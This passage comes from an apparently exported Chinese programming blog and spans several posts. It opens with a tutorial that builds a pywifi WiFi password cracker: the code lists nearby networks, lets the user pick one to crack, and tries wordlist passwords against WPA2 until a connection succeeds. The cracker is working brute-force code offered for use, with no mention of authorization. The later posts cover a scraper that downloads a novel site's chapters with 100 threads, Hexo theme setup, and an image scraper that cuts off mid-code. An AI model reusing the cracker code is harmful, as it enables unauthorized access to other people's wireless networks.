2417000]&#125;\n\n我们要把信号强度大的放在前面，所以我们需要对这个字典进行排序。\n我们先写一个函数read_wifi_data()来读取字典中的数据，然后再写一个函数进行排序，即indexed_quicksort()函数。\n\n不过，read_wifi_data()函数的功能基于wifi_scan()函数，所以，我们先写排序。\n\n\n在这里我们选择快速排序算法，用快速排序算法来把信号强度大的放在前面，然后获取排序前的索引，然后根据索引来获取排序后的数据。一般来说，排序是把小的数字放在前面，大的数字放在后面，但是WiFi的强度signal是负数,越接近0，网络强度越好，所以，我们选择把信号强度大的放在前面。\n\n\n快速排序算法我们暂时不讲，后面咱们专门出一期排序算法的文章。(快速排序算法并不难，大家可以用调试器，去看看它的原理，我给出大家可以调试的代码,这个代码大家新建一个文件复制过去直接调试就行了)\ndef indexed_quicksort(array):    # 创建一个包含 (值, 原始索引) 的列表    arr_with_index = [(value, index) for index, value in enumerate(array)]    # 快速排序函数，对 arr_with_index 进行排序    def quicksort(arr):        if len(arr) &lt;= 1:            return arr        else:            # 随机选择基准元素            pivot_index = random.randint(0, len(arr) - 1)            pivot = arr[pivot_index][0]            left = []  # 小于基准的元素            right = []  # 大于基准的元素            middle = []  # 等于基准的元素            for value, original_index in arr:                if value &lt; pivot:                    left.append((value, original_index))                elif value &gt; pivot:                    right.append((value, original_index))                else:                    middle.append((value, original_index))            return quicksort(right) + middle + quicksort(left)  # 将较大的元素放在前面    # 执行快速排序    sorted_arr_with_index = quicksort(arr_with_index)    # 提取排序后的值和原始索引    # sorted_values = [value for value, _ in sorted_arr_with_index]  # 获取排序后的值    sorted_original_indices = [index for _, index in sorted_arr_with_index]  # 获取排序后的值的原始索引，用来匹配WiFi的信息    # print(sorted_original_indices)    return sorted_original_indicesee = indexed_quicksort([3, 6, 8, 10, 1, 2, 1])print(ee)\n\n\n我们现在需要知道的是，indexed_quicksort()函数返回的是排序后的值的原始索引，所以，我们需要根据这个索引来获取排序后的值。\n比如这个代码：\nee = indexed_quicksort([3, 6, 8, 10, 1, 2, 1])\n\n输出：\n排序前：ee = [3, 6, 8, 10, 1, 2, 1]排序后：ee_1 =[10, 8, 6, 3, 2, 1, 1]原始索引(排序后的值的索引，即10在ee[3], 8在ee[2], 6在ee[1]...)：[3, 2, 1, 0, 5, 4, 6]\n\n\n\n我们就得继续写read_wifi_data()函数，来读取字典中的数据，然后再根据索引来获取排序后的值。\ndef read_wifi_data(self,item_dict):#读取wifi数据，传入的item_dict为字典类型，包含wifi信息    #&#123;&#x27;SSID&#x27;: &#123;&#x27;MERCURY_9CEE&#x27;, &#x27;szpjwfhm_5G&#x27;, &#x27;szpjwfhm&#x27;, &#x27;CMCC-5Z94&#x27;&#125;, &#x27;Singnal level&#x27;: &#123;-71, -70, -59, -83&#125;, &#x27;BSSID&#x27;: &#123;&#x27;cc:2d:21:e5:cc:b1:&#x27;, &#x27;cc:2d:21:e5:cc:b5:&#x27;, &#x27;6c:59:40:7e:9c:ee:&#x27;, &#x27;ec:6c:b5:ea:3f:28:&#x27;&#125;, &#x27;Frequency&#x27;: &#123;2417000, 2472000, 5745000, 2447000&#125;&#125;    print(&quot;\\n&quot; + &quot;正在处理数据...&quot;)    #将信号强度列表进行排序    wifi_list = self.indexed_quicksort(item_dict[&#x27;Singnal level&#x27;])    print(&quot;排序完成&quot; + &quot;\\n&quot;)    print(&quot;=&quot; * 20)    #读取wifi数据    print(&quot;正在读取wifi数据...&quot;)    print(&quot;=&quot; * 20 + &quot;\\n&quot;)    num = 0    wifi_signal_list = []    for i in range(len(wifi_list)):        num += 1        print(&quot;正在读取第%d个wifi数据...&quot; % (num))        print(&quot;WiFi编号：%d&quot; % (num))        print(&quot;名称：%s&quot; % item_dict[&#x27;SSID&#x27;][wifi_list[i]])        print(&quot;MAC地址：%s&quot; % item_dict[&#x27;BSSID&#x27;][wifi_list[i]])        print(&quot;频率：%s&quot; % item_dict[&#x27;Frequency&#x27;][wifi_list[i]])        print(&quot;信号强度：%s&quot; % item_dict[&#x27;Singnal level&#x27;][wifi_list[i]])        print(&quot;=&quot; * 20)        wifi_signal_list.append(item_dict[&#x27;SSID&#x27;][wifi_list[i]])    print(&quot;\\n&quot;+&quot;读取完成&quot;)    #print(wifi_signal_list)    print(&quot;\\n&quot;+&quot;*&quot; * 20)    return i,wifi_signal_list\n\n排完序，我们再创建一个wifi_signal_list列表，把排序后的信号强度大的放在前面，当然我们只放WiFi的名字(SSID)就行了,再前面的pywifi库中，WiFi的配置只需要名字和密码，名字我们放在这里，密码我们就放在text文件中了。\n最后，我们把read_wifi_data()函数的返回值i,wifi_signal_list返回，即i是排序后的索引，wifi_signal_list是排序后的WiFi的名字(SSID)的列表，因为我们要选择要破解的WiFi，所以我就需要i这个参数来确保我们的输入的数字是正确的，能让我们正确索引列表。\n注意：i是从0开始的，所以到时候判断输入的索引范围的时候要注意一下。\n\n接下来，按照思路，我们应该写一个来选择要破解的WiFi的函数，即wifi_attack_choose函数。\n这个函数，我们要传入，我们上个编写的函数的i参数，以及wifi_signal_list参数，然后，我们就能根据i参数来选择要破解的WiFi。\ndef wifi_attack_choose(self,count,singnal_list):#选择需要破解的wifi    while True:        # 选择需要破解的wifi        choose_wifi = int(input(&quot;请输入需要破解的wifi的编号：&quot;)) - 1  # 因为索引是从0开始的，所以这里要减1        if choose_wifi &lt; 0 or choose_wifi &gt; count:            print(&quot;输入错误，请重新输入&quot;)            continue        else:            break\n\n\nchoose_wifi数字是比i大一的，因为i是从0开始，而平常我们是从一开始的，所以，我们要减1。\n\n写完这个函数，我们就要开始配置文件了。\n\n按照我们pywifi库的使用方法，我们先写一个简单的配置\nprofile = Profile()profile.ssid = &quot;需要破解的wifi名称&quot;  # wifi名称# 网卡开放状态# &quot;Auth - AP&quot; 验证算法profile.auth = const.AUTH_ALG_OPEN# WiFi的加密算法为&quot;WPA&quot;# 选择WiFi加密算法# &quot;Akm - AP&quot; 的密钥管理profile.akm.append(const.AKM_TYPE_WPA2PSK)# 加密单元# &quot;Cipher - AP&quot; 密码类型profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元# 设置密码profile.key = 字典中保存的密码  # wifi密码self.iface.remove_all_network_profiles()  # 删除所有wifi配置文件self.iface.add_network_profile(profile)  # 添加wifi配置文件self.iface.connect(profile)  # 连接wifitime.sleep(1) #等待连接,这个可以防止连接过快导致无法连接if self.iface.status() == const.IFACE_CONNECTED:    print(&quot;密码: %s 校验成功&quot; % try_password)    print(&quot;\\n&quot;+&quot;密码为：%s&quot; % try_password)    input(&quot;按任意键退出&quot;)    return Noneelse:    print(&quot;密码: %s 校验失败&quot; % try_password)    pass\n\n这就是我们的配置，我们想想，我们要干什么，要循环读取字典中保存的密码进行尝试，所以，我们就得循环读取字典中的密码，然后尝试连接，如果连接成功，就打印密码，如果连接失败，就继续尝试下一个密码。\npath = &quot;wifi_password.txt&quot;with open(path, &quot;r&quot;) as f:    data = f.read()    data = data.split(&quot;\\n&quot;)\n\n\n我们这里读取密码的文本文件，文件中每一行保存一个密码，所以，我们要用split()函数把文件的换行符去掉。\n\n\n然后我们循环遍历字典\n\n def wifi_crack(self,wifi_name_attack):#破解wifi密码     print(&quot;正在破解wifi密码...&quot;)     # 读取字典文件     # 字典文件格式：text     path = &quot;wifi_password.txt&quot;     with open(path, &quot;r&quot;) as f:         data = f.read()         data = data.split(&quot;\\n&quot;)         for try_password in data:             #print(line)             profile = Profile()             profile.ssid = wifi_name_attack  # wifi名称             # 网卡开放状态             # &quot;Auth - AP&quot; 验证算法             profile.auth = const.AUTH_ALG_OPEN             # WiFi的加密算法为&quot;WPA&quot;             # 选择WiFi加密算法             # &quot;Akm - AP&quot; 的密钥管理             profile.akm.append(const.AKM_TYPE_WPA2PSK)             # 加密单元             # &quot;Cipher - AP&quot; 密码类型             profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元             # 设置密码             profile.key = try_password  # wifi密码             self.iface.remove_all_network_profiles()  # 删除所有wifi配置文件             self.iface.add_network_profile(profile)  # 添加wifi配置文件             self.iface.connect(profile)  # 连接wifi             time.sleep(1) #等待连接,这个可以防止连接过快导致无法连接             if self.iface.status() == const.IFACE_CONNECTED:                 print(&quot;密码: %s 校验成功&quot; % try_password)                 print(&quot;\\n&quot;+&quot;密码为：%s&quot; % try_password)                 input(&quot;按任意键退出&quot;)                 return None             else:                 print(&quot;密码: %s 校验失败&quot; % try_password)                 pass\n\n这样，我们的WiFi密码破解器就完成了。\n\n代码解析:快速排序算法下面是代码示例：\nimport randomdef quicksort(array):    if len(array) &lt;= 1:        return array    else:        # 随机选择基准元素        pivot_index = random.randint(0, len(array) - 1)        pivot = array[pivot_index]        left = []  # 小于基准的元素        right = []  # 大于基准的元素        middle = []  # 等于基准的元素        for value in array:            if value &lt; pivot:                left.append(value)            elif value &gt; pivot:                right.append(value)            else:                middle.append(value)        # 将较大的元素放在前面        return quicksort(right) + middle + quicksort(left)# 执行快速排序sorted_array = quicksort([3, 6, 8, 10, 1, 2, 1])print(sorted_array)\n\n大家可以把这一段代码复制到一个新的py文件中\n快速排序的步骤：\n\n选择基准元素：通常是数组中间的元素，也可以是随机选择的元素\n分区：根据基准把数组分成两部分，一部分小于基准，一部分大于基准\n递归排序：递归地将上述步骤应用到基准左边和右边的子数组上。\n合并：将排序好的两部分合并成一个数组\n\n我们的代码就是按照这个步骤来实现的。\n假设我们pivot_index是2,那么我们选择的基准数就是8，那么递归数组，我们的left数组就是[3, 6, 1, 2, 1]，right数组就是[10]，middle数组就是[8]。\n然后我们再递归排序left数组，right数组。\nright数组就一个数他会直接返回这个数组，而递归left数组，他就会按照上面的流程从新选择基准数，然后分区，然后再去调用自身，再去分区，直到排序完成。\n这样说，并不直观，但是我们只要去调试代码，就能理解快速排序的原理。\n所以，希望大家亲自去调试一下代码，看看它是如何工作的。\n\n最后欣赏一下自己的成果吧！\n如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！\n爱发电地址:https://afdian.net/a/AuroraBreeze\n\n","categories":["python"],"tags":["pywifi"]},{"title":"python爬虫系列:beautifulsoup爬虫与线程池","url":"/2024/06/21/python%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97-beautifulsoup%E7%88%AC%E8%99%AB%E4%B8%8E%E7%BA%BF%E7%A8%8B%E6%B1%A0/","content":"python爬虫系列:beautifulsoup爬虫与线程池前言这篇文章，也是对CSDN文章的修改，使用beautifulsoup爬取网页，并使用线程池提高爬取速度。\nPython代码import refrom concurrent.futures import ThreadPoolExecutor #导入线程池，加速爬取import requestsfrom bs4 import BeautifulSoupimport osif not os.path.exists(&quot;webspider_book&quot;):    os.mkdir(&quot;webspider_book&quot;)url =&quot; https://www.bigee.cc/book/78647/&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;&#125;def get_url(url):#要用两次直接写个函数算了    res = requests.get(url,headers=headers)    soup = BeautifulSoup(res.text,&quot;lxml&quot;)    return soupdef get_max_page(url): #获取下载的最大页数    list = get_url(url).select(&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;)    page_finall = re.findall(r&quot;/book/78647/(.*).html&quot;, str(list[-1][&#x27;href&#x27;]))[0] #正则匹配最后一个章节的页码    #print(page_finall)    return page_finall #返回最大页数def get_book_content(url):#下载单个页面的函数    soup = get_url(url)    name = soup.select(&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;)[0].get_text()    #print(name)    content = soup.select(&quot;#chaptercontent&quot;) #获取章节内容    content = str(content[0].get_text()) #获取章节内容    #print(content)    f = open(f&quot;webspider_book/&#123;name&#125;.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)    f.write(content)#写入文件    print(f&quot;&#123;name&#125;下载完成----------&quot;)if __name__ == &#x27;__main__&#x27;:    num = int(get_max_page(url=url))    print(f&quot;共&#123;num&#125;页----------&quot;)    with ThreadPoolExecutor(100) as t: #线程池大小为100        for i in range(1,num+1):            t.submit(get_book_content,f&quot;https://www.bigee.cc/book/78647/&#123;i&#125;.html&quot;) #提交任务    print(&quot;线程池执行完毕&quot;)\n\n正文准备工作\n我们需要下载的是requests和beautifulsoup4库，如果没有安装，请使用以下命令安装,lxml也需要下载。\npip install requests\n\npip install beautifulsoup4\n\npip install lxml\n\n\n对于线程池，我们需要导入concurrent.futures库，并创建一个ThreadPoolExecutor对象，这个就不需要下载了，这是自带的，对于concurren.futures的使用，我们这里只讲解一下ThreadPoolExecutor的使用，其他的内容大家自行探索。\n\n代码:分析思路分析\n这次我们的目标是爬取目标网站的小说，下载下来并用线程池加速下载,目标网址为：\nhttps://www.bigee.cc/book/78647/\n好了，想要爬去内容，我们需要先分析网站的结构，去看看我们要爬取的内容在哪里。\n\n按 F12 进入开发者工具\n\n\n\n这样我们就可以看到了小说的地址到底是不是，我们可以进去看一看。\n\n我们也知道，我们看到的是相对的位置，然后我们在小说内容的部分看到了他的地址\n\nhttps://www.bigee.cc/book/78647/1.html\n\n我们看到的相对位置\n\n&#x2F;book&#x2F;78647&#x2F;1.html\n\n我们这样就察觉到他们之间不就只差了一个https://www.bigee.cc吗？到时候我们只需要拼接一下，就可以拿到我们想要的页面的url了。\n我们再看其他章节的地址，我们可以看到，他们的地址都是类似的，只是最后的数字不同。\n\nhttps://www.bigee.cc/book/78647/2.html\n\n\nhttps://www.bigee.cc/book/78647/3.html\n\n所以如果我们想要下载所有的章节，我们只需要遍历所有的数字，然后拼接一下就可以了。\n那我们就需要先获取到这个最大的页码，然后遍历所有的数字，再在页面中下载内容就可以了。\n代码:获取最大页码那我们现在要做的就是获取最大的页码，我们可以用requests和beautifulsoup4来获取。\nimport requestsfrom bs4 import BeautifulSoupimport reurl =&quot; https://www.bigee.cc/book/78647/&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;&#125; #设置请求头,模拟浏览器res = requests.get(url,headers=headers).text#获取网页内容soup = BeautifulSoup(res,&quot;lxml&quot;)#解析网页内容,加载lxml解析器list = soup.select(&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;)page_finall = re.findall(r&quot;/book/78647/(.*).html&quot;,list[-1][&#x27;href&#x27;])print(page_finall)\n\n这里我们使用beautifulsoup的select来获取到所有的章节的链接，也就是拿到所以我们匹配的a标签，这会生成一个列表。\n对于BS4怎么去选择这个标签，我们也可以直接去浏览器进行复制，具体BS4的选择方法，大家可以自行探索。\n下面是复制的步骤\n\n\n但是我们复制的结果是：body &gt; div.listmain &gt; dl &gt; dd:nth-child(2) &gt; a\n因为我们要拿到最后一个章节的链接，而这个选择只能让我们拿到第一个章节的url，所以我们需要改一下，改为：body &gt; div.listmain &gt; dl &gt; dd a\n我们就能拿到这样的信息了。\n\n这是一个列表，最后的章节在列表的最后一个，我们可以用list[-1]来获取到最后一个章节的链接。\n我们通过list[-1][&#39;href&#39;]来获取到最后一个章节的链接,这是bs4的一种方法。\n接下来我们用正则表达式来匹配这个链接，正则表达式的匹配规则是：r&quot;/book/78647/(.*).html&quot;\n\n其中（.*）的意思是匹配任意字符，当然必须在/book/78647/和.html之间。\n\n对于正则的使用可以来这里学习：https://deerchao.cn/tutorials/regex/regex.htm\n这样最后我们就拿到了最大的页码了，也就是313\n\n\n\n在这个网站中还有点小问题他隐藏了一部分章节的url在另一个代码块中，大家可以去看看\n\n\n代码:下载我们现在需要先写一个代码把第一页的内容都下载下来，其他的页面，除了url不一样以外其他的相同。\n我们先进入第一页，F12进入开发者工具，分析一下。\n\nimport requestsfrom bs4 import BeautifulSoupimport osif not os.path.exists(&quot;book&quot;):    os.mkdir(&quot;book&quot;)headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;&#125;url = &quot;https://www.bigee.cc/book/78647/1.html&quot;res = requests.get(url,headers=headers).textsoup = BeautifulSoup(res,&quot;lxml&quot;)name = soup.select(&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;)[0].get_text() #获取小说名#print(name)content = soup.select(&quot;#chaptercontent&quot;)#获取章节内容content = str(content[0].get_text())#获取章节内容print(content)f = open(f&quot;webspider_book/&#123;name&#125;.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)f.write(content)\n\nbs4中获取标签内容的方法，是使用get_text() 方法，我们可以直接获取到章节的内容，但是我们用的select方法，返回的是一个列表，我们就需要拿到列表中的内容，当然，列表中也就只有这一个元素。因为我们选择器选择的#chaptercontent标签（浏览器复制的地址就是这个），所以我们直接用content[0]就能拿到章节的标签，然后用get_text()方法来获取到章节的内容。\n\n小说名同理，直接去网页上用浏览器直接复制地址就可以了。\n然后我们把章节的内容写入文件，文件名就是小说名，我们用f = open(f&quot;webspider_book/&#123;name&#125;.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)来创建文件，然后用f.write(content)来写入内容。\n这样我们就下载了第一页的内容。\n\n代码:优化实现我们现在已经有了下载单个页面的函数，我们可以用线程池来加速下载，我们可以用ThreadPoolExecutor来创建线程池，然后用submit()方法来提交任务。\n简单来说，我们不需要用循环来慢慢下载网页内容了，我们直接用线程池来下载，线程池创建本来就需要循环，我们把有规律的url遍历提交给线程池。\n正常放前面不经常用和经常用但不需要改动的数据\nimport refrom concurrent.futures import ThreadPoolExecutor #导入线程池，加速爬取import requestsfrom bs4 import BeautifulSoupimport osif not os.path.exists(&quot;webspider_book&quot;):    os.mkdir(&quot;webspider_book&quot;)url =&quot; https://www.bigee.cc/book/78647/&quot;headers = &#123;    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;&#125;\n\n在前面的讲述中\nres = requests.get(url,headers=headers)soup = BeautifulSoup(res.text,&quot;lxml&quot;)\n\n用到了两次，所以就干脆写了个函数，这样就不用重复写了，让代码看起来干净些。\ndef get_url(url):#要用两次直接写个函数算了    res = requests.get(url,headers=headers)    soup = BeautifulSoup(res.text,&quot;lxml&quot;)    return soup\n\n因为我们需要实例化，所以这个函数就得把实例化的对象soup返回，这样才可以使用。\ndef get_max_page(url): #获取下载的最大页数    list = get_url(url).select(&quot;body &gt; div.listmain &gt; dl &gt; dd a&quot;)    page_finall = re.findall(r&quot;/book/78647/(.*).html&quot;, str(list[-1][&#x27;href&#x27;]))[0] #正则匹配最后一个章节的页码    #print(page_finall)    return page_finall #返回最大页数\n\n这个函数就是获取最大的页码,但是他也需要先实例化soup对象，所以我们就把get_url()函数也写进来，让他实例化并返回soup对象，最后正则获取到最后一个章节的url。\ndef get_book_content(url):#下载单个页面的函数    soup = get_url(url)    name = soup.select(&quot;#read &gt; div.book.reader &gt; div.content &gt; h1&quot;)[0].get_text()    #print(name)    content = soup.select(&quot;#chaptercontent&quot;) #获取章节内容    content = str(content[0].get_text()) #获取章节内容    #print(content)    f = open(f&quot;webspider_book/&#123;name&#125;.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)    f.write(content)#写入文件    print(f&quot;&#123;name&#125;下载完成----------&quot;)\n\n这个函数是下载对应页面的内容，他也需要先实例化soup对象，所以我们继续用我们刚开始写的get_url()函数来实例化，然后用select()方法来获取到小说名，然后用get_text()方法来获取到小说名和章节内容。\nif __name__ == &#x27;__main__&#x27;:    num = int(get_max_page(url=url))    print(f&quot;共&#123;num&#125;页----------&quot;)    with ThreadPoolExecutor(100) as t: #线程池大小为100        for i in range(1,num+1):            t.submit(get_book_content,f&quot;https://www.bigee.cc/book/78647/&#123;i&#125;.html&quot;) #提交任务    print(&quot;线程池执行完毕&quot;)\n\n在这里我们先运行get_max_page()函数来获取最大的页码，url我们在上面已经先声明了，然后我们用ThreadPoolExecutor来创建线程池，线程池大小为100 **(可以自己调整)**，然后用for循环来遍历所有的页码，然后用submit()方法来提交任务，任务就是get_book_content()函数，我们把页码和url拼接起来，然后提交给线程池,这样我们就能很快的把小说爬完了。\n\n如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！\n爱发电地址:https://afdian.net/a/AuroraBreeze\n\n","categories":["python"],"tags":["爬虫"]},{"title":"kaze主题配置建议","url":"/2024/06/21/kaze%E9%85%8D%E7%BD%AE%E5%BB%BA%E8%AE%AE/","content":"kaze主题配置建议\n因为kaze的主题配置文档已经看不了了，而且kaze的github也已经一年多没有进行提交了，并且kaze的主题用的人并不多，所以我就把我摸索的知识来分享一下。\n\n前言请先安装好hexo及kaze主题。\n修改为中文页面kaze主题默认为英文，所以需要修改为中文，但是修改为中文的配置文件并不在kaze主题的-config.yml文件中，而是在hexo的_config.yml文件中。\n所以我们去hexo的_config.yml文件中找到language字段，将其修改为zh-CN。\n\n\n修改完成后，我们的主题页面就变成了中文了。\n\n\n删除不必要的页面kaze主题有很多页面，其中有些页面似乎并没有布置好，我们进去后发现这些页面都是空白的，所以我们可以将这些页面删除掉。\n在这里我们只需要把那些没有用的页面进行注释掉就可以了。\n在kaze的_config.yml中注释掉about页面的配置，可以参照我的配置。\n\n当然要告诉你的一点是，友链的link并没有中文，所以这里我们手动把他改为中文。\n\nkaze主题的_config.yml配置下面大家可以根据图片进行对应配置。\n\n\n\n\n\n\n这里图片上传的方式是图床，大家可以去网上找些免费的图床。\n不过，我还是推荐用自己的文件夹放图片，一是不用担心钱的问题，二是可以自己管理图片，不用担心博客文章里的图片丢失。\n这是我配置图片的信息，给大家看看。\n\n\n我直接在hexo的source文件夹中创建了这两个放图片的文件夹。\n不过，我这种方式有点烂，我还是比较推荐在source文件中只建一个文件夹专门放图片，然后再在创建的文件夹中再创建各个博客文章要用的文件夹，这样方便管理。\n这是我在markdown语言中对图片的引用\n\n用..表示上一级目录，这样再进入创建的文件夹里拿图片就可以了。\n\n\n\n这个链接是有官方的配置的，图标只能用官方的，而且官方的的图标并不多，大家可以去这个网站来看看：\nhttps://www.cnblogs.com/yuanlinblog/p/16654439.html\n\n\n\n\n这个就是友链，我们可以把他的名字什么的改了，avatar是头像，这里要放头像的链接，description就是描述了，当然这里你可以放许多的人。\n\n\n\n注意：kaze的搜索默认关闭，所以我们要把enable改为true才会开启搜索功能。其他的地方就不需要改动了。\n\n\n \n注意：kaze的访问统计是不可用的，开启了也是统计错误的访问次数，所以我们关闭，其他的看注释就好了。\n\n\nkaze主题的评论是默认关闭的，我们把enable改为true就开启了评论功能。\n评论用的插件是valine，这需要我们注册一个leancloud账号，然后在valine的_config.yml文件中填入自己的app_id和app_key。\n大家要去：https://console.leancloud.cn/ 注册一个leancloud账号，然后创建一个应用\n\n\n\n\n然后我们在valine的_config.yml文件中填入自己的app_id和app_key，这样我们就可以用评论功能了。\n具体使用可以去valine的官方文档看看：https://valine.js.org/quickstart.html\n\n这三个箭头分别是数学公式的渲染（默认关闭），代码块的渲染，以及文章字数统计（默认开启）文章的统计分析（默认关闭）。\n\n\n这里改字体大小\n\n博客文章的配置\ntitle：文章标题\ndate：文章日期\ntags：文章标签\ncategories：文章分类\n对应的也就是\n\n\n我们的博客的文章底部也需要修改\n\n不修改的话，文章链接是错误的。\n\n注意：这里文章的链接修改不在kaze的配置文件_config.yml中，而是在hexo的_config.yml文件中,所以我们去hexo的配置文件中修改。\n\n\n在这里把自己的博客地址放上就可以了。\n\n如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！\n爱发电地址:https://afdian.net/a/AuroraBreeze\n\n","categories":["hexo"],"tags":["kaze"]},{"title":"hexo部分问题解决","url":"/2024/06/21/hexo%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","content":"hexo部分问题解决1. 处理hexo的代码高亮问题在处理kaze主题的时候，因为需要找到一个合适的代码高亮的主题，所以我就在kaze的代码高亮中修改配置文件，同时又修改了hexo的配置文件，但我发现了一个问题，那就是代码高亮的颜色不太对，而且不能及时的修改，不管用hexo g生成几次都是原来的样子。\n经过一番搜索，终于找到了解决办法，下面是解决方法：\n解决方法\n找到hexo的配置文件_config.yml，找到highlight部分，修改hljs为true，把wrap改为true这样就能把我们的代码圈起来,注意的是highlight的显示代码行数在kaze主题中是不能使用的。\n\n用hexo clean命令清除缓存，然后用hexo g命令重新生成静态文件。这一步非常的重要，如果不去清楚缓存，就不会生效。\n\n重新打开博客，代码高亮应该就正常了。\n\n\n\n以上就是解决hexo代码高亮问题的方法，希望能帮到大家。\n\n","categories":["hexo"],"tags":["hexo"]},{"title":"python爬虫系列:Xpath爬取图片","url":"/2024/06/20/python%E7%88%AC%E8%99%AB%E7%B3%BB%E5%88%97-Xpath%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/","content":"python爬虫系列:Xpath爬取图片前言这篇文章很久之前就写完了，可是听说这篇文章有许多的问题，但是我在CSDN上并不敢改这篇文章，因为很可能改了就再也发不出来了，所以趁着我搭建了一个博客，把这篇文章重新写一遍，顺便把之前写的烂代码改一下，希望这篇文章能帮到大家。\n其次，希望大家学习一下基本的html语法。\npython代码import timefrom lxml import etreeimport requestsimport osheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;&#125;url_list = []page = 0if not os.path.exists(&quot;./pic/&quot;):     os.makedirs(&quot;./pic/&quot;)def pic_path():    global page,url_list    while True:        page = input(&quot;输入下载页数：&quot;)        try:            page = int(page)        except ValueError:            print(&quot;输入页数有误！&quot;)            continue        if page == 1:            url = &quot;https://pic.netbian.com/4kdongman/index.html&quot;            return url        elif page &gt; 1:            for i in range(2, page + 1):                url_list.append(&quot;https://pic.netbian.com/4kdongman/index.html&quot;)                url_list.append(&quot;https://pic.netbian.com/4kdongman/index_&#123;&#125;.html&quot;.format(i))            return None        else:            print(&quot;输入页数有误！&quot;)            continuedef download(url):    if url is not None:        response = requests.get(url, headers=headers).text.encode(&#x27;iso-8859-1&#x27;)        Batch_processing(response)    else:        for url in url_list:            response = requests.get(url, headers=headers).text.encode(&#x27;iso-8859-1&#x27;)            Batch_processing(response)def Batch_processing(response):    tree = etree.HTML(response)    pic_list = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;)    for pic_list_item in pic_list:        # print(pic_list_item.xpath(&#x27;a/img/@src&#x27;)[0])        # print(pic_list_item.xpath(&#x27;a/b/text()&#x27;)[0])        html_url = &quot;https://pic.netbian.com&quot; + pic_list_item.xpath(&#x27;a/img/@src&#x27;)[0]        name_pat = pic_list_item.xpath(&#x27;a/b/text()&#x27;)[0]        print(html_url)        print(name_pat)        try:            name = str(name_pat.replace(&quot; &quot;, &quot;_&quot;) + &quot;.jpg&quot;)            name = str(name.replace(&quot;*&quot;, &quot;&quot;))  # 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存            pic_get = requests.get(html_url, headers=headers).content            pic_save_path = &quot;./pic/&quot; + name            with open(pic_save_path, &#x27;wb&#x27;) as f:                f.write(pic_get)                print(name + &quot;下载完成！&quot;)        except :            print(name + &quot;下载失败！&quot;)        time.sleep(0.2)#print(response)&quot;&quot;&quot;pic_path = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img&#x27;)pic_name = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/b&#x27;)print(pic_path[0].get(&#x27;src&#x27;))print(pic_name[0].text)&quot;&quot;&quot;if __name__ == &#x27;__main__&#x27;:    url = pic_path()    download(url)\n\n\n\n\n正文准备工作\n首先，我们需要安装lxml库，这是Python的一个第三方库，可以用来解析和操作XML和HTML文档，也是我们使用Xpath爬取网页图片所必须的Python库。\npip install lxml\n\n\n其次是安装requests库，这是Python的一个第三方库，可以用来发送HTTP请求，我们使用它来获取网页内容，基本上大部分爬虫都需要这个库。\npip install requests\n\n\n最后，我们也会用到Python的os模块，用来处理图片的下载，以及time模块，来减缓我们的请求频率，毕竟我们只是练习，我们并不希望用这个爬虫给别人网站造成压力。\n\n代码解析之一思路分析\n这次我们的目标是在这个网站进行图片的爬取下载,网站的网址为\nhttps://pic.netbian.com/4kdongman/index.html\n我们需要分析这个网站的结构，拿到我们所需要的信息，从而进行下载图片。\n我们首先去分析目标网站，我们这次挑选的网站结构比较简单。\n\n按 F12 进入开发者工具\n\n\n通过图片上的步骤我们进入到网站html界面放置图片的位置。\n\n接下来我们去找图片到底在哪里，我们这里只找到了相对位置\n\n\n\n记得刷新，不刷新找不到这些图片\n\n\n我们从这找到了图片的位置，到底是不是这张图片，我门去这个url里看看\n\n我们可以看到，我们找到的url是正确的，所以我们想要下载图片，就必须拿到图片的url。\n\n接下来我们分析我们拿到的相对位置与图片的位置有什么区别？\n\n我们先来看我们拿到的相对位置\n&#x2F;uploads&#x2F;allimg&#x2F;240618&#x2F;202141-1718713301deda.jpg\n我们再来看我们找到的图片的位置\nhttps://pic.netbian.com/uploads/allimg/240618/202141-1718713301deda.jpg\n\n这两个地址之间就差了一个https://pic.netbian.com所以如果我们拿到了相对位置，只需要在相对位置上加上https://pic.netbian.com就能找到图片的url。\n\n\n代码解析之二我们现在先编写代码把相对位置的图片url转换成绝对位置的图片url\n这里的代码与最后的代码不同，我们以后会改。\nimport timefrom lxml import etreeimport requestsimport osheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 